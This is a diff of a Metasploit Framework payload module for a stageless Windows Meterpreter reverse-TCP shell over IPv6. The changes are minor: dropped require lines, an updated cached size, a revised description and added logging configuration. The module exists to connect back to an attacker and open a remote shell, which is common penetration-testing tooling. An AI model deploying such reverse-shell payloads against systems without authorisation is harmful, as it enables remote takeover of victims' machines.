@@ -3,16 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/payload/transport_config'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/core/payload/windows/meterpreter_loader'
-require 'msf/base/sessions/meterpreter_x86_win'
-require 'msf/base/sessions/meterpreter_options'
-require 'rex/payloads/meterpreter/config'
 
 module MetasploitModule
 
-  CachedSize = 179779
+  CachedSize = 175686
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
@@ -24,7 +18,7 @@ module MetasploitModule
 
     super(merge_info(info,
       'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6)',
-      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
+      'Description' => 'Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.',
       'Author'      => [ 'OJ Reeves' ],
       'License'     => MSF_LICENSE,
       'Platform'    => 'win',
@@ -57,8 +51,8 @@ module MetasploitModule
       transports: [transport_config_reverse_ipv6_tcp(opts)],
       extensions: (datastore['EXTENSIONS'] || '').split(','),
       ext_init:   (datastore['EXTINIT'] || ''),
-      stageless:  true
-    }
+      stageless:  true,
+    }.merge(meterpreter_logging_config(opts))
 
     # create the configuration instance based off the parameters
     config = Rex::Payloads::Meterpreter::Config.new(config_opts)
